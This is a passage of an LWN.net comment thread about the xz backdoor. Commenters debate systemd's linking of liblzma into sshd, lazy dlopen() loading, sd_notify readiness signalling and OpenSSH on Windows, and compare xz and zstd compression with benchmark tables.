That's tricky to implement (because doing things in the resolver is \*always\* a bit tricky) but I can't immediately think of any reason why it's \*impossible\*. It would need a new dynamic tag of course, DT\_LAZY\_NEEDED? DT\_NEEDED\_OPTIONAL?

You couldn't use the simpleminded approach above for everything (good luck making this work for things like data symbols where the GOT is needed before the PLT or in general anywhere you couldn't have used lazy binding before, or where you need the shared library's ELF constructors to run early, or where TLS inadequacies would prevent dlopen from working happily -- and it has the same security implications as using lazy binding) but it should work in a fairly large proportion of cases.

### A backdoor in xz

Posted Mar 31, 2024 16:13 UTC (Sun)
by **Cyberax** (**✭ supporter ✭**, #52523)
[[Link](/Articles/967696/)] (4 responses)

> The main reason this is done and will happen is to reduce mandatory dependencies

No, it's not. It's done to \_paper\_ over dependencies, making them harder to discover statically and creating wonderful race conditions if mimmutable() is used at an inopportune moment. It's an all-around bad decision.

### A backdoor in xz

Posted Mar 31, 2024 17:06 UTC (Sun)
by **nix** (subscriber, #2304)
[[Link](/Articles/967702/)] (3 responses)

Since mimmutable() does not exist on Linux, making changes in Linux-only software like systemd to allow for it seems deeply bizarre, particularly when those changes \*reduce\* security (like, say, increasing the set of always-loaded libraries to include some which have just been seen to launch attacks when loaded, rather than loading as many as possible of them only as needed).

What next? Shall we make changes to allow for Windows's per-libc malloc(), or for Linux's not-at-all-planned upcoming transition to Mach-O?

### A backdoor in xz

Posted Mar 31, 2024 18:54 UTC (Sun)
by **Cyberax** (**✭ supporter ✭**, #52523)
[[Link](/Articles/967720/)] (2 responses)

> Since mimmutable() does not exist on Linux

This is subject to change: <https://lwn.net/Articles/958438/>

> particularly when those changes \*reduce\* security

They don't. libsystemd will \_still\_ depend on xz, it just will be hidden from cursory analysis.

> What next? Shall we make changes to allow for Windows's per-libc malloc(),

That's actually a pretty good idea, that will make several classes of vulnerabilities more difficult to exploit.

> or for Linux's not-at-all-planned upcoming transition to Mach-O?

I'd take PE: <https://blog.hiler.eu/win32-the-only-stable-abi/>

### A backdoor in xz

Posted Mar 31, 2024 19:36 UTC (Sun)
by **nix** (subscriber, #2304)
[[Link](/Articles/967728/)] (1 responses)

> They don't. libsystemd will \_still\_ depend on xz, it just will be hidden from cursory analysis.

I honestly wonder if you're even reading this thread. This attack depended on liblzma being loaded into sshd's memory because it was loaded by virtue of DT\_NEEDED: after this commit, it would not be loaded at all, because libsystemd would only have loaded it if compressed journal reading was attempted, which sshd never attempts.

So it \*would\* in fact solve the problem.

But I'm tired of arguing with a brick wall with prejudged opinions, I think. Good night.

### A backdoor in xz

Posted Mar 31, 2024 20:16 UTC (Sun)
by **Cyberax** (**✭ supporter ✭**, #52523)
[[Link](/Articles/967732/)]

> This attack

Reread your words. THIS attack. As in, this \_particular\_ one. Sure, having the library dlopen()-ed prevents it. I can think of several ways I can backdoor liblzma to work around it.

Making the system usable with mimmutable/mseal would prevent whole categories of exploits. And promoting the dlopen() craze will make this kind of mitigation impossible.

And yeah, I absolutely hate the braindead design of nsswitch, PAM, and now libsystemd.

### A backdoor in xz

Posted Mar 30, 2024 17:04 UTC (Sat)
by **rra** (subscriber, #99804)
[[Link](/Articles/967484/)] (3 responses)

This specific exploit I believe relied on being loaded into the process namespace early so that it could set up IFUNCs. I am very far from an expert in how this works, but if I'm understanding this correctly, it would be too late to do this during dlopen (if the library were even dlopened; the primary mitigation is that sshd would have never dlopened liblzma at all with this new systemd design).

### A backdoor in xz

Posted Mar 30, 2024 17:18 UTC (Sat)
by **nix** (subscriber, #2304)
[[Link](/Articles/967488/)] (2 responses)

IFUNCs are invoked upon dlopen() and can alas do the same sort of evil thing then that they do here (though they're not supposed to), but of course in this case libsystemd would never have done the dlopen() so the IFUNC would never have had a chance to execute.

IFUNCs are not really the villain here. It is perfectly possible for liblzma to have done the same sort of evil using only perfectly normal symbol interposition, dlsym(..., RTLD\_NEXT) and ELF constructors.

### A backdoor in xz

Posted Mar 30, 2024 19:08 UTC (Sat)
by **andresfreund** (subscriber, #69562)
[[Link](/Articles/967518/)] (1 responses)

It would have been harder and noisier to do what the backdoor did during dlopen, even if it were called. By that time sshd's .got would have been read only, so redirection would have required remapping.

### A backdoor in xz

Posted Mar 30, 2024 23:21 UTC (Sat)
by **nix** (subscriber, #2304)
[[Link](/Articles/967562/)]

I dunno, some parts would have been easier -- after dlopen() you can at least trust that libc functions etc can be freely called, which is somewhat risky with IFUNCs in libraries loaded via DT\_NEEDED. (But more likely they'd just have hunted something else down and attacked that instead. They only have to be lucky once...)

### A backdoor in xz

Posted Mar 30, 2024 6:16 UTC (Sat)
by **mchehab** (subscriber, #41156)
[[Link](/Articles/967336/)] (5 responses)

> It's pretty difficult to get systemd integration right without patching sshd. Upstream are BSD folks and very firmly Don't Care About Systemd; there's no hope of getting that patch upstream.

Why systemd would possible require any integration with sshd? Originally, it started as a replacement for initrd, meant to make system init faster. See [https://0pointer.de/blog/projects/systemd.html:](https://0pointer.de/blog/projects/systemd.html%3A)

> For a fast and efficient boot-up two things are crucial:

>

> - To start less.

> - And to start more in parallel.

In practice, system init is now a lot heavier and takes a lot more time to start a system than what it used to be with sysV init.

It also is now not only a PID 1 replacement, but it does lots of integration and interaction with almost everything needed for a system to run, including audit trails/logs.

With that, it became a component that can be compromised indirectly via changes on dozens (or hundreds?) of different components that are not directly related to systemd itself. That opened a window like what just happened where a malicious code introduced into xz is capable of compromising systems that contain systemd integration OOT patches.

IMO, systemd should return to its roots and stop requiring interactions with other packages unrelated to PID 1's task.

### A backdoor in xz

Posted Mar 30, 2024 6:55 UTC (Sat)
by **intelfx** (subscriber, #130118)
[[Link](/Articles/967340/)] (4 responses)

> Why systemd would possible require any integration with sshd?

To signal (and receive) the readiness state of the daemon in question. Not more, not less.

> IMO, systemd should return to its roots and stop requiring interactions with other packages unrelated to PID 1's task.

I'd say that "reliably determining whether the supervised process has successfully started up" (i. e. loaded and parsed its configuration, bound all the necessary sockets, did not encounter any other failures) is very much within the definition of the PID 1's task.

### A backdoor in xz

Posted Mar 30, 2024 22:57 UTC (Sat)
by **mchehab** (subscriber, #41156)
[[Link](/Articles/967553/)] (1 responses)

> > Why systemd would possible require any integration with sshd?

> To signal (and receive) the readiness state of the daemon in question. Not more, not less.

System V init never needed that, as there are simple generic solutions to monitor that. Basically, when a process is forked on a child process and such child dies, the parent is notified. This a well-defined POSIX-defined behavior.

> > IMO, systemd should return to its roots and stop requiring interactions with other packages unrelated to PID 1's task.

>

> I'd say that "reliably determining whether the supervised process has successfully started up" (i. e. loaded and parsed its configuration, bound all the necessary sockets, did not encounter any other failures) is very much within the definition of the PID 1's task.

It shall be up to sshd process - and to all other system daemons - to die if it failed to parse configuration and/or bind necessary sockets. The task of PID 1 is to monitor if the process is dying too fast, and, on such cases, to take some action.

There's absolutely no need to modify system daemons, implementing non-POSIX out-of-tree hacks just for PID 1 to be aware that a process is up and running.

### A backdoor in xz

Posted Mar 31, 2024 2:07 UTC (Sun)
by **intelfx** (subscriber, #130118)
[[Link](/Articles/967602/)]

> System V init never needed that

Yes, and it sucked.

> This a well-defined POSIX-defined behavior

The fact that it is well-defined or POSIX-defined does not automatically mean that it's \_good\_. I hate to break it to you, but POSIX is not a pinnacle of system design.

> It shall be up to sshd process - and to all other system daemons - to die if it failed to parse configuration and/or bind necessary sockets

Setting up a proper readiness notification by double-forking is approximately tenfold more complicated and requires exponentially more moving parts than the sd\_notify mechanism.

In fact, many daemons (including openssh) do not complete their initialization until after the fork, so the only correct implementation of the interface you describe entails the immediate child \_waiting\_ for the grandchild to finish its setup, and only then exiting. Which means that there has to be a temporary pipe or socket between the child and the grandchild.

So now we are choosing between a socket notification mechanism implemented \_once\_ in a well-audited, well-maintained project (systemd) and \*\*the same socket notification mechanism\*\* plus a bunch of historical nonsense implemented \_all over again\_ in each daemon.

I trust the choice is obvious.

### A backdoor in xz

Posted Apr 4, 2024 15:34 UTC (Thu)
by **koh** (subscriber, #101482)
[[Link](/Articles/968420/)] (1 responses)

> To signal (and receive) the readiness state of the daemon in question. Not more, not less.

Why would liblzma be needed for that?

### A backdoor in xz

Posted Apr 4, 2024 15:44 UTC (Thu)
by **cjwatson** (subscriber, #7322)
[[Link](/Articles/968423/)]

It's not any more (following <https://github.com/systemd/systemd/pull/31550> and [https://salsa.debian.org/ssh-team/openssh/-/commit/cc5f37...](https://salsa.debian.org/ssh-team/openssh/-/commit/cc5f37cb8405cba624a133f4b8f464fbe381c5c8)).

### A backdoor in xz

Posted Mar 29, 2024 20:03 UTC (Fri)
by **mussell** (subscriber, #170320)
[[Link](/Articles/967221/)] (14 responses)

It's necessary because upstream doesn't really consider Linux a first-class citizen. OpenSSH is primarily developed for OpenBSD and the version that runs on the vast majority of systems is the OpenBSD version with a portability layer.

Genuinely surprised that's there's no project to replace OpenSSH in a memory safe language that is designed around the OS that everyone actually uses.

### A backdoor in xz

Posted Mar 29, 2024 20:09 UTC (Fri)
by **diegor** (subscriber, #1967)
[[Link](/Articles/967226/)] (12 responses)

> Genuinely surprised that's there's no project to replace OpenSSH in a memory safe language that is designed around the OS that everyone actually uses.

Windows? Not trolling, but just trying to make a point...

### A backdoor in xz

Posted Mar 29, 2024 20:30 UTC (Fri)
by **intelfx** (subscriber, #130118)
[[Link](/Articles/967234/)] (5 responses)

>> Genuinely surprised that's there's no project to replace OpenSSH in a memory safe language that is designed around the OS that everyone actually uses.

>

> Windows? Not trolling, but just trying to make a point...

Perhaps we could amend that to "<...> around the OS that everyone actually uses OpenSSH on"?

### A backdoor in xz

Posted Mar 29, 2024 22:43 UTC (Fri)
by **magfr** (subscriber, #16052)
[[Link](/Articles/967275/)] (4 responses)

Windows.

OpenSSH is part of Windows 10+

You can finally open up cmd and type ssh user@system and the right thing happens.

### A backdoor in xz

Posted Mar 29, 2024 23:59 UTC (Fri)
by **skissane** (subscriber, #38675)
[[Link](/Articles/967289/)]

Most Windows users never use OpenSSH.

Vast majority of Windows installs have the OpenSSH server disabled.

And a lot of Windows users who actually do use an SSH client aren't using the bundled OpenSSH client – they are using PuTTY, or Cygwin/MSYS2 OpenSSH, or WSL OpenSSH, or one of a dozen other open source and proprietary Windows SSH clients.

I really doubt use of Windows bundled OpenSSH is greater than OpenSSH use on Linux (which includes WSL)

### A backdoor in xz

Posted Mar 30, 2024 3:51 UTC (Sat)
by **ibukanov** (subscriber, #3942)
[[Link](/Articles/967325/)]

Like 3 years ago I lost a few hours after trying Windows-bundled ssh. During git clone or pull it sometimes stopped working.

### A backdoor in xz

Posted Mar 30, 2024 7:04 UTC (Sat)
by **intelfx** (subscriber, #130118)
[[Link](/Articles/967343/)]

> Windows.

> OpenSSH is part of Windows 10+

> You can finally open up cmd and type ssh user@system and the right thing happens.

That's not the openssh \_daemon\_. And it's not the OS everyone \*uses\* openssh on.

### A backdoor in xz

Posted Mar 30, 2024 7:47 UTC (Sat)
by **jem** (subscriber, #24231)
[[Link](/Articles/967349/)]

Last time I checked, OpenSSH on Windows was a joke. Microsoft is doing a half-hearted job with the Windows port. It typically lags a few versions behind, and they don't even bother to write their own documentation, but instead refer to the man pages of the upstream version. Microsoft uses the same version numbering, for example calling their version OpenSSH 8.2, even if they leave out features at will. For example, the last Windows version I checked completely lacked support for PKCS11 (smart cards). The -I option was not recognized.

Also, if you wanted to use ssh agent, you had to install the SSH server, because ssh agent was bundled with the server package, not the client package, showing a complete lack of understanding of what the role of ssh agent is.

### A backdoor in xz

Posted Mar 30, 2024 8:14 UTC (Sat)
by **niner** (subscriber, #26151)
[[Link](/Articles/967361/)] (5 responses)

There are a lot more Linux boxes than Windows boxes. It's just that a lot of them are virtual and there are more non-desktop than desktop ones.

### A backdoor in xz

Posted Mar 30, 2024 9:39 UTC (Sat)
by **geuder** (subscriber, #62854)
[[Link](/Articles/967374/)] (4 responses)

Really? I mean Linux boxes having a stable, public IPv4 address and exposing sshd. Not counting Android and other embedded stuff.

I have no statistics whatsoever at hands. On one side it sounds unbelievable that you need more servers than people to serve. On the other hand computing has become such a waste of resources that I wouldn't be too surprised if you were correct.

### A backdoor in xz

Posted Mar 30, 2024 9:52 UTC (Sat)
by **niner** (subscriber, #26151)
[[Link](/Articles/967380/)] (1 responses)

Why not count embedded stuff? From Wifi routers to TVs to security cameras to light bulbs, they are running Linux and compromising them can give you a foot hold in a network.

Then of course there are millions and millions of systems comprising the cloud.

### A backdoor in xz

Posted Mar 30, 2024 12:55 UTC (Sat)
by **geuder** (subscriber, #62854)
[[Link](/Articles/967407/)]

In general yes. But I thought here we were discussing the concrete attack to get a backdoor into sshd.

I don't think a lot of those systems listen to the internet using sshd.

Of course with the hundreds of commits by the maintainer account in question it's not impossible that sshd is only the first attack vector found and there are also others.

### A backdoor in xz

Posted Mar 30, 2024 13:24 UTC (Sat)
by **pawel44** (guest, #162008)
[[Link](/Articles/967376/)] (1 responses)

You need Linux servers to scan the web for Windows viruses. Furthermore, if we count Android the answer is clear.

### A backdoor in xz

Posted Mar 30, 2024 14:39 UTC (Sat)
by **smurf** (subscriber, #17840)
[[Link](/Articles/967443/)]

On the other hand, stock Android doesn't run a ssh server.

### A backdoor in xz

Posted Mar 30, 2024 14:37 UTC (Sat)
by **TRS-80** (guest, #1804)
[[Link](/Articles/967441/)]

<https://github.com/mkj/sunset> from the author of dropbear

### A backdoor in xz

Posted Mar 29, 2024 20:10 UTC (Fri)
by **dullfire** (guest, #111432)
[[Link](/Articles/967225/)]

> It seems to me that distributions shouldn't be modifying a critical piece of security infrastructure like sshd. Isn't that just asking for trouble?

yeah my reaction as well. sshd is one of the few has-to-be-priviledge processes with an exposed attack surface even on hardened systems.

### A backdoor in xz

Posted Mar 29, 2024 21:02 UTC (Fri)
by **judas\_iscariote** (guest, #47386)
[[Link](/Articles/967242/)] (3 responses)

I want you to go back to your comment after trying to pass anything through openSSH upstream maintainers. They literally don't care about linux features or requests at all.

### A backdoor in xz

Posted Mar 29, 2024 23:49 UTC (Fri)
by **cjwatson** (subscriber, #7322)
[[Link](/Articles/967284/)] (2 responses)

To be fair, I have got Linux-specific patches into openssh-portable a number of times. They're just very conservative - not necessarily a bad thing!

### A backdoor in xz

Posted Mar 31, 2024 10:48 UTC (Sun)
by **ssl** (guest, #98177)
[[Link](/Articles/967651/)] (1 responses)

OpenSSH ≠ openssh-portable

### A backdoor in xz

Posted Mar 31, 2024 11:11 UTC (Sun)
by **cjwatson** (subscriber, #7322)
[[Link](/Articles/967655/)]

I'm aware, but since the immediate upstream for most distributions is openssh-portable and that's who we report bugs to, I thought it likely that the other people talking about OpenSSH in this thread actually meant openssh-portable.

### A backdoor in xz

Posted Mar 29, 2024 21:08 UTC (Fri)
by **atnot** (subscriber, #124910)
[[Link](/Articles/967247/)] (1 responses)

I think that's kind of missing the point.

XZ was clearly just means to an end here. They almost definitely ran "ldd" on the ssh binary on a debian system two years ago and scanned the list of libraries for whatever upstream was least maintained and would be easiest to compromise. If it wasn't XZ, it would have been the next thing on the list.

### A backdoor in xz

Posted Mar 29, 2024 21:52 UTC (Fri)
by **sjj** (guest, #2020)
[[Link](/Articles/967255/)]

I think you’re right. This was most likely attempt to get a longer term vulnerability into sshd/systemd/selinux/etc. It’s a multi pronged attack, including brigading the xz maintainer to add another maintainer.

### A backdoor in xz

Posted Mar 30, 2024 1:37 UTC (Sat)
by **bluca** (subscriber, #118303)
[[Link](/Articles/967311/)] (22 responses)

> It seems to me that distributions shouldn't be modifying a critical piece of security infrastructure like sshd. Isn't that just asking for trouble?

No, it isn't, you are missing the wood for the trees. It's normal for distributions to patch core components - pick any distro and look at their kernel, gcc or glibc packages and you'll find tons of patches. The issue here is that a combination of archaic release practices (make-dist tarball generated who-knows-where-by-whom) and very sophisticated attack almost caused a disaster, essentially because of a lack of supply chain security.

### A backdoor in xz

Posted Mar 30, 2024 11:07 UTC (Sat)
by **MarcB** (subscriber, #101804)
[[Link](/Articles/967392/)] (21 responses)

The question is, why OpenSSH is linking against libsystemd and not just implementing the needed subset of the notify API. The sd\_notify interface is simple and stable.

But for Systemd in general, what is XZ actually needed for? If it is just for the journal, you might want to consider dropping this. xz was only part-time-maintained by a single person before the malicious co-maintainer joined. And LZMA does not add match (anything?) over ZSTD.

### A backdoor in xz

Posted Mar 30, 2024 11:52 UTC (Sat)
by **chris\_se** (subscriber, #99706)
[[Link](/Articles/967398/)] (9 responses)

> And LZMA does not add match (anything?) over ZSTD.

I don't remember all the details, but ~ 8 months or so ago I experimented with replacing xz with zstd for fs images at $dayjob - and while zstd was a LOT faster, even at max zstd level the files were still ~ 20% larger than a plain xz -7. (xz -9 was too slow to be practical) Take the exact number with a grain of salt because it's from memory, but the difference was significant.

In our case the significantly higher compression ratio was worth it.

Can't speak about systemd, but I would definitely not make any absolute statements that there are NO advantages to xz/lzma.

### A backdoor in xz

Posted Mar 30, 2024 19:25 UTC (Sat)
by **MarcB** (subscriber, #101804)
[[Link](/Articles/967419/)] (8 responses)

Did you use the "ultra" settings for zstd or any of the advanced options? Maybe there are some binary data scenarios where LZMA still wins, but in all tests I did, zstd achieved better compression. But this always was mostly textual data.

### A backdoor in xz

Posted Mar 30, 2024 21:19 UTC (Sat)
by **mbunkus** (subscriber, #87248)
[[Link](/Articles/967543/)] (4 responses)

Really? I always think of zstd as worse but orders of magnitude faster than xz, and worse but in-different-universes-kind-of-faster than bzip9 (all at default settings).

After reading another comment in this thread about using zstd for systemd's journal, I did a short test with a 1.6 GB journal export file (journalctl -o export …). The results were roughly:

```

| Type         | Size | Time  |
|--------------|------|-------|
| uncompressed | 1.6G | —     |
| gzip         | 78M  | 6.9s  |
| bzip2        | 58M  | 1m34s |
| zstd         | 62M  | 0.9s  |
| zstd -9      | 51M  | 3.9s  |
| xz           | 43M  | 4.5s  |

```

With the exception of zstd -9 all other compressors used their default settings.

(As stated in journalctl's man page, the "export" format is mostly text with a small amount of binary data for structure)

I'd be interested in situations where zstd compresses better than xz. Do you have some concrete numbers?

### A backdoor in xz

Posted Mar 31, 2024 0:29 UTC (Sun)
by **MarcB** (subscriber, #101804)
[[Link](/Articles/967573/)] (3 responses)

At work, it was a large mail archive; essentially write-only - if we ever have to read it, something went wrong (legally speaking :-)

For linux-6.8.2.tar (1.4G), I get 137MiB for xc -9 and and 133MiB for zstd --ultra -22.

### A backdoor in xz

Posted Mar 31, 2024 12:15 UTC (Sun)
by **mbunkus** (subscriber, #87248)
[[Link](/Articles/967648/)] (2 responses)

Ooooh I hadn't been aware zstd has compression levels higher than 9. Good to know.

I did a couple more tests with this knowledge; here's the updated table:

```

| Type             | Size |     Time |
|------------------|-----:|---------:|
| uncompressed     | 1.6G |        — |
| gzip             |  78M |     6.9s |
| bzip2            |  58M |  1m34.1s |
| zstd             |  62M |     0.9s |
| zstd -9          |  51M |     3.9s |
| zstd -19         |  44M |  3m38.6s |
| zstd --ultra -22 |  41M | 21m43.1s |
| xz               |  43M |     4.5s |
| xz -9            |  43M |    15.6s |

```

So yes, you can get zstd down to below xz, at least with content that is mostly text, but now the duration completely flips upside down with xz looking good with 5s & zstd being so far out of this world that it isn't funny anymore.

Note, though, that xz is multi-threaded & zstd all the others don't seem to be: zstd only used a single core even on --ultra -22 whereas xz -9 used eight of my 32 cores. That being said, "zstd -19" uses 14.6 times the amount of time, "zstd --ultra -22" is at an unbelievable 83.5 times, making it still slower per core than "xz -9".

Does multi-core processing matter? Let's take build pipelines such as a build server for a distribution such as Debian as an example. If they want to achieve high utilization of their resources, they have to run stuff in parallel. This means that they can either assign a single core to each build VM & run a lot of build VMs in parallel, or they can assign multiple cores to each build VM & run fewer of them. In the latter case having a compression step that can only make use of a single core & that takes x times the time of another compressor with similar results in compression ratio, that yields rather low utilization.

Don't get me wrong; I really like zstd & the tradeoffs it makes. I use it as my default compressor in most day-to-day use cases for its impressive speed, especially interactively. But when file size is a concern (e.g. a lot of countries out there where internet traffic is mostly mobile & therefore both slow & expensive at the same time), xz pretty much always wins, no matter how you look at it. It's really no big surprise for me it has gained such wide-spread usage in the OSS world.

### A backdoor in xz

Posted Mar 31, 2024 17:46 UTC (Sun)
by **andresfreund** (subscriber, #69562)
[[Link](/Articles/967707/)] (1 responses)

> Note, though, that xz is multi-threaded & zstd all the others don't seem to be: zstd only used a single core even on --ultra -22 whereas xz -9 used eight of my 32 cores.

zstd -T0 will do the same.

### A backdoor in xz

Posted Mar 31, 2024 18:12 UTC (Sun)
by **mbunkus** (subscriber, #87248)
[[Link](/Articles/967713/)]

Indeed; I somehow totally missed that when glancing over zstd's options earlier today. Thanks for pointing that out.

Interestingly it does worse than "xz -T0" does wrt. how many cores it can effectively use. On my 32-core system with the same 1.6 GB input file "zstd --ultra -22 -T0" starts out using four cores but drops down to & stays at three cores after a handful of seconds. Therefore processing still takes 7m38s. Using a file or STDIN as input makes no difference. I guess zstd simply cannot segment the source as much as xz does.

Now "xz -T0" (which is the default in recent xz versions) also only uses eight cores on the same machine. Then again even with "-9" it is worlds faster both per core & in total than "zstd --ultra -22".

Then again, I'm really not trying to argue that xz is better than zstd, even though I probably sound like it. I just tried to answer the question why the OSS community has adopted xz as widely as it has, simply to satisfy my own curiosity. Also it's good to know the strengths & weaknesses of the various tools at our disposal.

### A backdoor in xz

Posted Mar 31, 2024 6:32 UTC (Sun)
by **chris\_se** (subscriber, #99706)
[[Link](/Articles/967628/)] (2 responses)

> Did you use the "ultra" settings for zstd or any of the advanced options?

I don't remember. I just redid the same checks again for a single file I had laying around (I did the previous checks against multiple variants), and I got this:

```
| Method           | Time (m:s) | RAM during compress | Size      |
|------------------|------------|---------------------|-----------|
| xz               | 2:12       |   95 MiB            | 135 MiB   |
| xz -7            | 2:22       |  187 MiB            | 134 MiB   |
| xz -9            | 2:34       |  675 MiB            | 115 MiB   |
| zstd             | 0:02       |   52 MiB            | 182 MiB   |
| zstd -19         | 2:49       |  250 MiB            | 147 MiB   |
| zstd --ultra -22 | 4:22       | 1328 MiB            | 121 MiB   |
```

(All done one a single CPU core, Intel Core i7-8700K. Debian 12 stable.)

My payload is basically a tar file of a minimized Debian 12 rootfs, plus some additional internal software -- nothing special. (Orig size: 554 MiB)

To summarize my test: even at --ultra -22 zstd is worse in all aspects compared to xz -9.

### A backdoor in xz

Posted Mar 31, 2024 16:06 UTC (Sun)
by **stefanor** (subscriber, #32895)
[[Link](/Articles/967693/)] (1 responses)

zstd makes a trade-off of compression to decompression resources.

The main promise of zstd over the other options is faster decompression, so I think it would only be fair to include that in the comparison.

### A backdoor in xz

Posted Apr 1, 2024 19:33 UTC (Mon)
by **chris\_se** (subscriber, #99706)
[[Link](/Articles/967897/)]

> The main promise of zstd over the other options is faster decompression, so I think it would only be fair to include that in the comparison.

Sure, one could do that, and zstd is probably going to be faster when it comes to decompression. But my original point was not to bash zstd - I was replying to the statement that zstd is always better than xz and that there's no reason to use xz at all. My second response where I posted my measurements was a little hyperbolic to underline that point.

Personally, I do quite like zstd - and if you look at my table, using the standard compression algorithm, you can reduce a filesystem image of 554 MiB down to 182 MiB (~32% of the original size) within just 2 seconds, which is a lot faster than what many other tools can do. (~60 times faster than xz in its default settings.) I do think zstd is an excellent algorithm to use as a default when no further constraints have been applied, because the tradeoffs it has chosen are very sensible for many applications.

The only point I'm trying to drive home is that if you have certain constraints - such as that the compressed size is to be as small as reasonably possible - then zstd might not be the algorithm you want to use in all cases (probably depending on what kind of data you want to compress), and that rhetoric such as "always use zstd, xz is obsolete" is not helpful. And while the broader public now knows a lot more about the past hardships of xz maintenance, hindsight is always 20/20, and I don't think the problems there were immediately obvious to most people just using xz themselves. I think that after-the-fact statements such as "people should not have used xz anymore anyway" are extremely unhelpful - not only because it's easy to say so after the fact, but also because I do think xz has some advantages in some situations and will remain a good choice when constraints require it.

### A backdoor in xz

Posted Mar 30, 2024 12:11 UTC (Sat)
by **bluca** (subscriber, #118303)
[[Link](/Articles/967401/)] (10 responses)

It's needed to compress/decompress journal files and coredumps. The former is done also via a public sd\_journal\* set of APIs hence it is in libsystemd.so. In git main we switched to dlopen these libs only when needed - ie, when the sd\_journal API is called \_and\_ it encounters a file compressed with the corresponding lib.

This will be the dependency tree of a fully-featured build of libsystemd in the next release:

build/libsystemd.so.0 (interpreter => None)

libcap.so.2 => /lib/x86\_64-linux-gnu/libcap.so.2

libc.so.6 => /lib/x86\_64-linux-gnu/libc.so.6

ld-linux-x86-64.so.2 => /lib/x86\_64-linux-gnu/ld-linux-x86-64.so.2

Compression libs and libgcrypt will all be dlopened on demand, if needed.

### A backdoor in xz

Posted Mar 30, 2024 13:58 UTC (Sat)
by **pbonzini** (subscriber, #60935)
[[Link](/Articles/967421/)] (5 responses)

I wonder however if simple and common functionality like notification and file descriptor retrieval belongs in the same public-facing library as reading the journal and the coredumps. Perhaps they should be moved out of libsystemd and into a two-file (.h and .c) copylib?

### A backdoor in xz

Posted Mar 31, 2024 12:17 UTC (Sun)
by **bluca** (subscriber, #118303)
[[Link](/Articles/967661/)] (4 responses)

It used to be, but it was merged, because it's just an unnecessary pain for developers to have to know multiple extremely similar libraries, and have to reason about which one to use and link to, etc etc.

The manager <-> service protocol is trivial, so the solution is to just reimplement it if that's all you need. I'll check whether we have some MIT-0 copy-paste ready examples, and if not add it to the documentation.

### A backdoor in xz

Posted Apr 1, 2024 5:31 UTC (Mon)
by **mchapman** (subscriber, #66589)
[[Link](/Articles/967758/)] (3 responses)

systemd used to provide [a reference implementation](https://github.com/systemd/systemd/blob/0e4061c4d5de6b41326740ee8f8f13c168eea28d/src/libsystemd-daemon/sd-daemon.c) (+ [header](https://github.com/systemd/systemd/blob/0e4061c4d5de6b41326740ee8f8f13c168eea28d/src/systemd/sd-daemon.h)). Perhaps something like this could be brought back?

### A backdoor in xz

Posted Apr 1, 2024 11:02 UTC (Mon)
by **bluca** (subscriber, #118303)
[[Link](/Articles/967780/)] (2 responses)

There will be a MIT-0 (so it can be copy/pasted with impunity) self-contained example in the documentation where the protocol is defined

### A backdoor in xz

Posted Apr 2, 2024 17:16 UTC (Tue)
by **bluca** (subscriber, #118303)
[[Link](/Articles/967996/)]

This is now published: [https://www.freedesktop.org/software/systemd/man/devel/sd...](https://www.freedesktop.org/software/systemd/man/devel/sd_notify.html#Notes)

### A backdoor in xz

Posted Apr 2, 2024 20:40 UTC (Tue)
by **himi** (subscriber, #340)
[[Link](/Articles/968032/)]

A similar reference implementation in a few other common languages would be nice, too - with systemd it's gotten so easy to write system daemons in things like python that a copyable reference implementation would be quite helpful. It's simple enough that no one's bothered writing a library, but fiddly enough to do properly that rolling your own isn't always the best option.

### A backdoor in xz

Posted Mar 30, 2024 17:21 UTC (Sat)
by **nix** (subscriber, #2304)
[[Link](/Articles/967489/)] (2 responses)

Journal files and coredumps really are a case where zstd would be a better choice than lzma: it's nearly as good compression-wise but compression is \*much\* faster, and both journals and coredumps are compressed much more often than they're uncompressed. (For things like .xz distro artifacts this is the other way around, so spending loads of time for slightly better compression is often a good idea -- or would be if xz wasn't also much slower and more memory-hungry than zstd at decompressing!)

### A backdoor in xz

Posted Mar 31, 2024 12:19 UTC (Sun)
by **bluca** (subscriber, #118303)
[[Link](/Articles/967662/)] (1 responses)

xz, gz and std are all supported, with a compile-time option to choose which one to use.

### A backdoor in xz

Posted Mar 31, 2024 13:54 UTC (Sun)
by **nix** (subscriber, #2304)
[[Link](/Articles/967683/)]

In hindsight, of course they are! I should have checked. (I'm even using zstd on my own system, but of course I forgot. I, uh, blame the clocks changing. ... what do you mean they only changed after I made that comment?)

### A backdoor in xz

Posted Mar 30, 2024 21:49 UTC (Sat)
by **MarcB** (subscriber, #101804)
[[Link](/Articles/967532/)]

This looks like a major improvement, at the very least, the spill-over into other process address spaces will be prevented.

Let's hope distributions follow up on this and reduce the set of essential packages.

### A backdoor in xz

Posted Mar 29, 2024 21:04 UTC (Fri)
by **wsy** (subscriber, #121706)
[[Link](/Articles/967245/)] (5 responses)

My worst nightmare has happened. Given the complexity of modern systems, how can I sleep again?

### A backdoor in xz

Posted Mar 29, 2024 21:26 UTC (Fri)
by **mb** (subscriber, #50428)
[[Link](/Articles/967248/)] (3 responses)

> how can I sleep again

Become a gardener, lumberjack or hermit.

### A backdoor in xz

Posted Mar 29, 2024 21:48 UTC (Fri)
by **joey** (guest, #328)
[[Link](/Articles/967257/)] (1 responses)

I am at least 2 out of 3 and am still gonna lose sleep over this.

### A backdoor in xz

Posted Mar 30, 2024 5:12 UTC (Sat)
by **marcH** (subscriber, #57642)
[[Link](/Articles/967332/)]

There should be a button to nominate LWN's "comment of the week".

### A backdoor in xz

Posted Mar 30, 2024 22:16 UTC (Sat)
by **detiste** (subscriber, #96117)
[[Link](/Articles/967551/)]

You can't eat your cake and have it too... (not my words)

### A backdoor in xz

Posted Mar 29, 2024 21:47 UTC (Fri)
by **atai** (subscriber, #10977)
[[Link](/Articles/967256/)]

Set an idle timer. Idle for five minutes and suspend

### A backdoor in xz

Posted Mar 30, 2024 0:19 UTC (Sat)
by **Trelane** (subscriber, #56877)
[[Link](/Articles/967290/)]

Gentoo's notice: <https://security.gentoo.org/glsa/202403-04>

Gentoo's bug: <https://bugs.gentoo.org/928134>

### A backdoor in xz

Posted Mar 30, 2024 0:25 UTC (Sat)
by **pabs** (subscriber, #43278)
[[Link](/Articles/967294/)]

Another update, sounds like libarchive might have separate vulnerabilities also caused by the attacker:

[https://boehs.org/node/everything-i-know-about-the-xz-bac...](https://boehs.org/node/everything-i-know-about-the-xz-backdoor)

### A backdoor in xz

Posted Mar 30, 2024 0:29 UTC (Sat)
by **pabs** (subscriber, #43278)
[[Link](/Articles/967295/)]

HN discussion:

<https://news.ycombinator.com/item?id=39865810>

### A backdoor in xz

Posted Mar 30, 2024 0:30 UTC (Sat)
by **pabs** (subscriber, #43278)
[[Link](/Articles/967296/)]

Related Mastodon thread:

